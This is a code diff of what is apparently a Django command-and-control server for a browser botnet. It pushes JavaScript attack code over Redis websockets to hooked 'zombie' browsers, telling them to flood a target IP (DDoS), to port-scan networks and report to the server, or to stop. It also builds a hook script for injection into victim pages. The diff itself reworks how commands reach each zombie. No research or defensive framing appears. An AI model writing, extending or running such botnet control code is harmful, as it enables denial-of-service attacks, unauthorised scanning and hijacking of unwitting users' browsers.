@@ -28,7 +28,6 @@ class IndexPage(View,TemplateResponseMixin,ContextMixin):
             return context
         @never_cache
         def get(self,request):
-            pdb.set_trace()
             #create attacker sesssion and model object if doesn't exist
             if not request.session.exists(request.session.session_key):
                     request.session.create()
@@ -45,8 +44,6 @@ class Controller(viewsets.ModelViewSet):
         #target ip and speed of requests
         target = request.data['targetip']
         timeout = request.data['timeout']
-
-        redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)
         #fetch js
         code =None
         try:
@@ -58,20 +55,18 @@ class Controller(viewsets.ModelViewSet):
 
         args = simplejson.dumps({'target':target,'timeout':timeout});
         # tell over Websocket zombies to attack target
-        redis_publisher.publish_message(RedisMessage(simplejson.dumps({'code': code,'args':args})))
+        for zombie in Zombie.objects.all():
+            redis_publisher = RedisPublisher(facility=zombie.facility,broadcast=True)
+            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'code': code,'args':args})))
         #ack to controller
         return Response({'ack':'ddos'})
 
     #cancels current attack for selected zombies
     @list_route(methods=['post'])
     def cancel(self,request,pk=None):
-        #cancel for N zombies
-        if 'zombies' in request.data:
-            redis_publisher = RedisPublisher(facility='solo',sessions=[Zombies.objects.get(host=h).sesskey for h in request.data['zombies']])
-            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'stopattack':'true'})))
-        #cancel for all zombies
-        else:
-            redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)
+        #need to allow for specific cancel
+        for zombie in Zombie.objects.all():
+            redis_publisher = RedisPublisher(facility=zombie.facility,broadcast=True)
             redis_publisher.publish_message(RedisMessage(simplejson.dumps({'stopattack':'true'})))
         #ack to controller
         return Response({'ack':'canceled'})
@@ -95,7 +90,7 @@ class Controller(viewsets.ModelViewSet):
             return HttpResponse("Failed to fetch portscan code: "+e)
         #tell zombie to scan network
         try:
-            redis_publisher = RedisPublisher(facility='solo', sessions=[Zombie.objects.get(host=target).sesskey])
+            redis_publisher = RedisPublisher(facility=Zombie.objects.get(host=target).facility,broadcast=True)
             args = simplejson.dumps({'server':request.get_host(),'timeout':timeout});
             redis_publisher.publish_message(RedisMessage(simplejson.dumps({'args':args,'code':code})))
         except Zombie.DoesNotExist:
@@ -106,15 +101,6 @@ class Controller(viewsets.ModelViewSet):
     #creates script to inject into zombies
     @list_route(methods=['post'])
     def hookcreate(self,request,pk=None):
-        #add ws redis
-        wsredis =None
-        try:
-            with open(os.getcwd()+"/ccstation/static/js/ws4redis.min.js","r") as f:
-                wsredis = f.read()
-        except IOError as e:
-            print(e)
-            return HttpResponse("failed to setup hook script:"+e)
-
         #add jquery min
         jquery =None
         try:
@@ -123,7 +109,7 @@ class Controller(viewsets.ModelViewSet):
         except IOError as e:
             return HttpResponse("Failed to setup hook script: "+e)
 
-        headers = wsredis+jquery
+        headers = jquery
         #server ip
         ipstr=  'var host = "{ipaddressport}";\n'
         #get injection script
